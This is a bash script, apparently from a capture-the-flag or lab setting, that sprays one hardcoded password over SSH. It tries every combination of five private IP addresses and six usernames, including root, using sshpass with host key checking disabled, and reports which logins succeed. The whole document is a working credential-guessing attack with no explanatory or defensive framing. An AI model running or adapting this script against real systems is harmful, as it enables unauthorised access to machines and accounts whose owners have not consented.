#!/bin/bash

IPS=("10.8.1.4" "10.8.1.5" "10.8.1.11" "192.168.8.2" "192.168.8.3")
USERS=("hacker" "safecracker" "lockpick" "buyer" "root" "mastermind")
PASSWORD="C0deBreaker1"

for IP in "${IPS[@]}"; do
    for USER in "${USERS[@]}"; do
        echo "Testing SSH connection to $IP as $USER..."
        if sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USER@$IP" exit 2>/dev/null; then
            echo "[+] Successfully connected to $IP as $USER"
        else
            echo "[-] Failed to connect to $IP as $USER"
        fi
        sleep 1
    done
done
